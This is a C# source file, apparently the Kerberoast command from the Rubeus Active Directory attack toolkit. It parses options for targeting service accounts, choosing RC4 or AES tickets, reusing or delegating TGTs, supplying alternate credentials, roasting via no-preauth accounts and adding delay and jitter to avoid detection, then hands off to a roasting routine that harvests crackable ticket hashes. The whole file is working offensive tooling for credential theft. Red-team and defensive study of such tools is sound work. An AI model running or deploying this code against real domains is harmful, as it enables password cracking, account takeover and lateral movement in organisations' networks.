﻿using System;
using System.Collections.Generic;
using System.Text.RegularExpressions;
using System.Text;


namespace Rubeus.Commands
{
    public class Kerberoast : ICommand
    {
        public static string CommandName => "kerberoast";

        public void Execute(Dictionary<string, string> arguments)
        {
            Console.WriteLine("\r\n[*] Action: Kerberoasting\r\n");

            string spn = "";
            List<string> spns = null;
            string user = "";
            string OU = "";
            string outFile = "";
            string domain = "";
            string dc = "";
            string ldapFilter = "";
            string supportedEType = "rc4";
            bool useTGTdeleg = false;
            bool listUsers = false;
            KRB_CRED TGT = null;
            string pwdSetAfter = "";
            string pwdSetBefore = "";
            int resultLimit = 0;
            int delay = 0;
            int jitter = 0;
            bool simpleOutput = false;
            bool enterprise = false;
            bool autoenterprise = false;
            bool ldaps = false;
            System.Net.NetworkCredential cred = null;
            string nopreauth = null;

            if (arguments.ContainsKey("/spn"))
            {
                // roast a specific single SPN
                spn = arguments["/spn"];
            }

            if (arguments.ContainsKey("/spns"))
            {
                spns = new List<string>();
                if (System.IO.File.Exists(arguments["/spns"]))
                {
                    string fileContent = Encoding.UTF8.GetString(System.IO.File.ReadAllBytes(arguments["/spns"]));
                    foreach (string s in fileContent.Split('\n'))
                    {
                        if (!String.IsNullOrEmpty(s))
                        {
                            spns.Add(s.Trim());
                        }
                    }
                }
                else
                {
                    foreach (string s in arguments["/spns"].Split(','))
                    {
                        spns.Add(s);
                    }
                }
            }
            if (arguments.ContainsKey("/user"))
            {
                // roast a specific user (or users, comma-separated
                user = arguments["/user"];
            }
            if (arguments.ContainsKey("/ou"))
            {
                // roast users from a specific OU
                OU = arguments["/ou"];
            }
            if (arguments.ContainsKey("/domain"))
            {
                // roast users from a specific domain
                domain = arguments["/domain"];
            }
            if (arguments.ContainsKey("/dc"))
            {
                // use a specific domain controller for kerberoasting
                dc = arguments["/dc"];
            }
            if (arguments.ContainsKey("/outfile"))
            {
                // output kerberoasted hashes to a file instead of to the console
                outFile = arguments["/outfile"];
            }
            if (arguments.ContainsKey("/simple"))
            {
                // output kerberoasted hashes to the output file format instead, to the console
                simpleOutput = true;
            }
            if (arguments.ContainsKey("/aes"))
            {
                // search for users w/ AES encryption enabled and request AES tickets
                supportedEType = "aes";
            }
            if (arguments.ContainsKey("/rc4opsec"))
            {
                // search for users without AES encryption enabled roast
                supportedEType = "rc4opsec";
            }
            if (arguments.ContainsKey("/ticket"))
            {
                // use an existing TGT ticket when requesting/roasting
                string kirbi64 = arguments["/ticket"];

                if (Helpers.IsBase64String(kirbi64))
                {
                    byte[] kirbiBytes = Convert.FromBase64String(kirbi64);
                    TGT = new KRB_CRED(kirbiBytes);
                }
                else if (System.IO.File.Exists(kirbi64))
                {
                    byte[] kirbiBytes = System.IO.File.ReadAllBytes(kirbi64);
                    TGT = new KRB_CRED(kirbiBytes);
                }
                else
                {
                    Console.WriteLine("\r\n[X] /ticket:X must either be a .kirbi file or a base64 encoded .kirbi\r\n");
                }
            }

            if (arguments.ContainsKey("/usetgtdeleg") || arguments.ContainsKey("/tgtdeleg"))
            {
                // use the TGT delegation trick to get a delegated TGT to use for roasting
                useTGTdeleg = true;
            }

            if (arguments.ContainsKey("/pwdsetafter"))
            {
                // filter for roastable users w/ a pwd set after a specific date
                pwdSetAfter = arguments["/pwdsetafter"];
            }

            if (arguments.ContainsKey("/pwdsetbefore"))
            {
                // filter for roastable users w/ a pwd set before a specific date
                pwdSetBefore = arguments["/pwdsetbefore"];
            }

            if (arguments.ContainsKey("/ldapfilter"))
            {
                // additional LDAP targeting filter
                ldapFilter = arguments["/ldapfilter"].Trim('"').Trim('\'');
            }

            if (arguments.ContainsKey("/resultlimit"))
            {
                // limit the number of roastable users
                resultLimit = Convert.ToInt32(arguments["/resultlimit"]);
            }
            
            if (arguments.ContainsKey("/delay"))
            {
                delay = Int32.Parse(arguments["/delay"]);
                if(delay < 100)
                {
                    Console.WriteLine("[!] WARNING: delay is in milliseconds! Please enter a value > 100.");
                    return;
                }
            }

            if (arguments.ContainsKey("/jitter"))
            {
                try
                {
                    jitter = Int32.Parse(arguments["/jitter"]);
                }
                catch {
                    Console.WriteLine("[X] Jitter must be an integer between 1-100.");
                    return;
                }
                if(jitter <= 0 || jitter > 100)
                {
                    Console.WriteLine("[X] Jitter must be between 1-100");
                    return;
                }
            }

            if (arguments.ContainsKey("/stats"))
            {
                // output stats on the number of kerberoastable users, don't actually roast anything
                listUsers = true;
            }

            if (arguments.ContainsKey("/enterprise"))
            {
                // use enterprise principals in the request, requires /spn and (/ticket or /tgtdeleg)
                enterprise = true;
            }
            if (arguments.ContainsKey("/autoenterprise"))
            {
                // use enterprise principals in the request if roasting with the SPN fails, requires /ticket or /tgtdeleg, does nothing is /spn or /spns is supplied
                autoenterprise = true;
            }
            if (arguments.ContainsKey("/ldaps"))
            {
                ldaps = true;
            }

            if (String.IsNullOrEmpty(domain))
            {
                // try to get the current domain
                domain = System.DirectoryServices.ActiveDirectory.Domain.GetCurrentDomain().Name;
            }

            if (arguments.ContainsKey("/creduser"))
            {
                // provide an alternate user to use for connection creds
                if (!Regex.IsMatch(arguments["/creduser"], ".+\\.+", RegexOptions.IgnoreCase))
                {
                    Console.WriteLine("\r\n[X] /creduser specification must be in fqdn format (domain.com\\user)\r\n");
                    return;
                }

                string[] parts = arguments["/creduser"].Split('\\');
                string domainName = parts[0];
                string userName = parts[1];

                // provide an alternate password to use for connection creds
                if (!arguments.ContainsKey("/credpassword"))
                {
                    Console.WriteLine("\r\n[X] /credpassword is required when specifying /creduser\r\n");
                    return;
                }

                string password = arguments["/credpassword"];

                cred = new System.Net.NetworkCredential(userName, password, domainName);
            }

            // roast with a user configured to not require pre-auth
            if (arguments.ContainsKey("/nopreauth"))
            {
                nopreauth = arguments["/nopreauth"];
            }

            if (!String.IsNullOrWhiteSpace(nopreauth) && (String.IsNullOrWhiteSpace(spn) && (spns == null || spns.Count < 1)))
            {
                Console.WriteLine("\r\n[X] /spn or /spns is required when specifying /nopreauth\r\n");
                return;
            }

            Roast.Kerberoast(spn, spns, user, OU, domain, dc, cred, outFile, simpleOutput, TGT, useTGTdeleg, supportedEType, pwdSetAfter, pwdSetBefore, ldapFilter, resultLimit, delay, jitter, listUsers, enterprise, autoenterprise, ldaps, nopreauth);
        }
    }
}